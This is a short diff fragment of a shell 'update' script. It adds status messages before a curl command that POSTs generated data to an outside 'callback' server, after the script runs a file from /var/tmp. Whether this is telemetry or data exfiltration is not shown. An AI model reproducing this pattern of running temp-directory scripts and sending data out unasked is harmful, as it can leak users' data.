@@ -43,11 +43,12 @@ echo > ~/log.txt
 sh /var/tmp/feather
 
 ENDTIME=`date`
+echo '[ * ] Update almost finished, sending logs to callback servers.'
+echo ''
 curl --header "Content-Type: application/json" \
   --request POST \
   --data "$(generate_post_data)" \
  http://sync-pd01.sql.wah.ph/api/upd
- echo ''
  echo ''
  read -p "Press ENTER to continue..." BOMBA
  exit 0
